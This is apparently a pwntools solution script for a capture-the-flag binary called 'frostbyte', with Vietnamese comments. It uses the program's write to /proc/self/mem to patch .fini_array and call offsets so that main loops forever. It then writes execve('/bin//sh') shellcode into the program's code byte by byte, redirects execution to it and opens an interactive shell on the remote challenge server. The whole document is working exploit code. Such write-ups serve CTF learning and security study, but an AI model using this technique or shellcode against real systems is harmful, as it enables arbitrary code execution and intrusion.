from pwn import *

context.binary = elf = ELF('./frostbyte')
context.log_level = 'info'

# p = process('./frostbyte')
p = remote('ctf.csd.lol', 8888)

def write_byte(addr, byte_val):
    p.sendlineafter(b': ', b'/proc/self/mem')
    p.sendlineafter(b': ', str(addr).encode())
    p.sendafter(b': ', p8(byte_val))

# --- BƯỚC 1: Hồi sinh (.fini_array) ---
fini = 0x403df0 
log.info(f"[-] Patching .fini_array ({hex(fini)}) -> 0xb5")
write_byte(fini, 0xb5)

# --- BƯỚC 2: Restart Loop (Jump to _start middle) ---
# Offset 0xD9 trỏ tới 0x4011b6 (mov rdx, rsp).
# Đây là điểm entry an toàn nhất trong _start để restart main.
call_offset_low = 0x4013d9
log.info("[-] Patching Low Byte -> 0xD9 (Safe Restart)")
write_byte(call_offset_low, 0xD9)

# --- BƯỚC 3: Recursive Loop (Jump to main+1) ---
# Offset 0xFE kết hợp với 0xD9 tạo thành target 0x4012b6.
# 0x4012b6 là byte thứ 2 của main, bỏ qua byte đầu của endbr64.
# Chương trình sẽ chạy tiếp vào push rbp -> main bình thường.
call_offset_high = 0x4013da
log.info("[-] Patching High Byte -> 0xFE (Recursive Main+1)")
write_byte(call_offset_high, 0xFE)
log.success("=> Infinite Recursive Loop Established!")

# --- BƯỚC 4: Ghi Shellcode ---
# Vòng lặp đã bất tử, ghi shellcode vào setup (0x401296).
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
target_code_addr = 0x401296 

log.info(f"[-] Writing shellcode to {hex(target_code_addr)}...")
for i in range(len(shellcode)):
    write_byte(target_code_addr + i, shellcode[i])

# --- BƯỚC 5: Kích hoạt Shellcode ---
# Target: FE B9 -> 0x401296 (Setup/Shellcode).
log.info("[-] Redirecting execution to shellcode...")
write_byte(call_offset_low, 0xB9)

p.clean() 

p.interactive()